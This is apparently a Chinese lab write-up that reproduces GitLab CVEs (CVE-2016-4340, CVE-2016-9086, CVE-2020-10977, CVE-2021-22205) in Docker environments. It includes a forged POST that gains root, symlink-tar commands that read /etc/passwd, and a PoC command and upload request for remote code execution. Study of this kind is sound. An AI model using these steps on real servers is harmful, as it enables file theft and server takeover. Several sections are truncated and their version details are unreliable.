作者：HKEcho@深蓝实验室重保天佑战队  
**前言**  
GitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，可通过 Web
界面访问公开或私人项目。这里整理了gitlab常见的漏洞，并在整理过程中发现网上对于gitlab的后利用相关内容较少，这里进行补充。
**GitLab版本检测**  
命令行：  
使用如下命令可查看当前GitLab的版本：  
cat /opt/gitlab/embedded/service/gitlab-rails/VERSION  
Web页面：  
登录后  
**1、CVE-2016-4340**  
**影响版本**  
Gitlab 8.7.0  
Gitlab 8.6.0-8.6.7  
Gitlab 8.5.0-8.5.11  
Gitlab 8.4.0-8.4.9  
Gitlab 8.3.0-8.3.8  
Gitlab 8.2.0-8.2.4  
**环境拉取**
    docker pull gitlab/gitlab-ce:8.7.0-ce.0
    docker run -d  -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:8.7.0-ce.0
环境搭好后需要更改密码，先创建普通用户，并登录：  
**漏洞复现**  
然后新建项目  
抓包并查看authenticity_token的值  
WmZhMvRYay9X3p27Ai%2Fu28xW5ndPsJrKVk3aCsas%2B0fUqNmligcX%2FqkzmBMSFElxjUKJRbscBcWDm3WCNG8zaw%3D%3D  
把包内容全部删除  
返回浏览器访问your-ip/admin/users/stop_impersonation?id=root  
丢弃掉空白的包，会看到新的包  
把数据包修改成post并加入post参数，最后把刚刚获取authenticity_token值替换进去。放包
    POST /admin/users/stop_impersonation?id=root
    . . .
    _method=delete&authenticity_token=WmZhMvRYay9X3p27Ai%2Fu28xW5ndPsJrKVk3aCsas%2B0fUqNmligcX%2FqkzmBMSFElxjUKJRbscBcWDm3WCNG8zaw%3D%3D
成功获取root权限  
**2、任意文件读取漏洞（CVE-2016-9086）**  
在8.9版本后添加的"导出、导入项目"功能，因为没有处理好压缩包中的软连接，已登录用户可以利用这个功能读取服务器上的任意文件。
    注：GitLab8.9.0-8.13.0版本的项目导入功能需要管理员开启，gitlab8.13.0版本之后所有用户都可以使用导入功能。管理员可以访问 http://domain/admin/application_settings 开启，开启之后用任意用户新建项目的时候，可以在export一项中看到。
**影响版本**  
GitLab CE/EEversions 8.9、8.10、8.11、8.12 和8.13  
**环境拉取**  
Vulhub执行如下命令启动一个GitLab Community Server 8.13.1：  
docker-compose up -d
    环境运行后，访问http://192.168.235.129:8080即可查看GitLab主页，其ssh端口为10022，默认管理员账号root、密码是vulhub123456。
    注意，请使用2G及以上内存的VPS或虚拟机运行该环境，实测1G内存的机器无法正常运行GitLab（运行后502错误）。
**漏洞复现**  
注册并登录一个帐户：  
然后单击”新建项目“页面上的“GitLab 导出”按钮：  
上传文件test.tar.gz，访问文件发现被泄露：/etc/passwd  
**原理分析**  
一个空的项目导出后结构如下：  
VERSION 的文件内容为GitLab的导出模块的版本，project.json则包含了项目的配置文件。  
导入GitLab的导出文件的时候，GitLab会按照如下步骤处理：  
1.服务器根据VERSION文件内容检测导出文件版本，如果版本符合，则导入。  
2.服务器根据Project.json文件创建一个新的项目，并将对应的项目文件拷贝到服务器上对应的位置。
    ...
    def check!
        version = File.open(version_file, &:readline)
        verify_version!(version)
    rescue => e
        shared.error(e)
        false
    end
    ...
    def verify_version!(version)
        if Gem::Version.new(version) != Gem::Version.new(Gitlab::ImportExport.version)
            raise Gitlab::ImportExport::Error.new("Import version mismatch: Required #{Gitlab::ImportExport.version} but was #{version}")
        else
            true
        end
    end
    ...
这里的逻辑是读取VERSION文件的第一行赋值给变量version，然后检测verison与当前版本是否相同，相同返回true，version不相同则返回错误信息(错误信息中包括变量的值).  
于是漏洞发现者巧妙的使用了软链接来达到读取任意文件的目的。首先，我们给VERSION文件加上软链接并重新打包。
    ln -sf /etc/passwd VERSION
    tar zcf change_version.tar.gz ./
这样，读取VERSION文件的时候服务器就会根据软链接读取到/etc/passwd的第一行内容并赋值给version。但是由于version与当前版本不相同，所以会输出version的值，也就是/etc/passwd第一行的内容。
访问之前搭建好的GitLab服务器，创建一个新的项目，填写完项目名称后在一栏中选择Import project fromGitLab
，export上传我们修改后的导入包，然后就可以看到/etc/passwd文件第一行  
但是，如果只读取任意文件的第一行，能做的事情还是太少了。漏洞发现者显然不满足这一结果，他继续找了下去.  
读取这一配置文件的代码位于：  
Project.json/lib/gitlab/import_export/project_tree_restorer.rb  
中：
    def restore
        json = IO.read(@path)
        tree_hash = ActiveSupport::JSON.decode(json)
        project_members = tree_hash.delete('project_members')
        ActiveRecord::Base.no_touching do
            create_relations
        end
    rescue => e
        shared.error(e)
        false
    end
在这里，我们可以再次使用软链接使变量获取到任意文件的内容，但是由于获取的json文件不是json格式，无法decode，导致异常抛出，最终在前端显示出任意文件的内容。添加软链接并打包:
    ln -sf /etc/passwd project.json
    tar zcf change_version.tar.gz ./
上传导出包，页面上显示的结果：  
参考链接  
**3、任意文件读取漏洞（CVE-2020-10977）**  
在Gitlab
8.5-12.9版本中，存在一处任意文件读取漏洞，攻击者可以利用该漏洞，在不需要特权的状态下，读取任意文件，造成严重信息泄露，从而导致进一步被攻击的风险。  
**影响版本**  
8.5 
**4、远程命令执行漏洞（CVE-2021-22205）**  
11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞CVE-2021-22204的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行命令。
**影响版本**  
该漏洞影响以下GitLab企业版和社区版：  
11.9  13.10.1版本服务器：  
docker-compose up -d  
环境启动后，访问  
**漏洞复现**  
**1、简单复现**  
GitLab的/uploads/user接口可以上传图片且无需认证，利用vulhub自带的poc.py脚本来测试这个漏洞：  
python poc.py  "touch /tmp/success"  
进入容器查看  
docker-compose exec gitlab bash  
可见touch /tmp/success已成功执行：  
**2、详细分析**  
获取X-CSRF-Token  
GET /users/sign_in  
RCE
    POST /uploads/user
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
    X-CSRF-Token: {{csrf-token}}